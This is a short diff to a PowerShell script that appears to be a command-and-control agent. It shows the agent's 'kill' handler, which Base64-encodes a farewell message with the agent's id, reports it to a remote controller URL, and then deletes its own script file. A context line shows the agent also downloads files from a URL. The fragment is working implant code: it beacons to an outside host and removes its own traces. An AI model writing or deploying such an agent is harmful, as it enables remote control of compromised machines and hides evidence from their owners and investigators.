@@ -135,6 +135,19 @@ $down= (Invoke-WebRequest -Uri $urldl -OutFile $path)
 }
 if ($act -eq "kill")
 {
+
+$a = "Bye Bye from Agent"
+
+
+
+$byebye = "$($a) $($id)"
+
+$EncbyebyeBytes = [System.Text.Encoding]::UTF8.GetBytes($byebye)
+
+$Encbyebye = [System.Convert]::ToBase64String($EncbyebyeBytes)
+
+
+$byebye=(Invoke-WebRequest "$url/ENDPOINT?MODE=res&RESPONSE=$Encbyebye&id=$id")
 Remove-Item -Path $MyInvocation.MyCommand.Source
 exit
 }
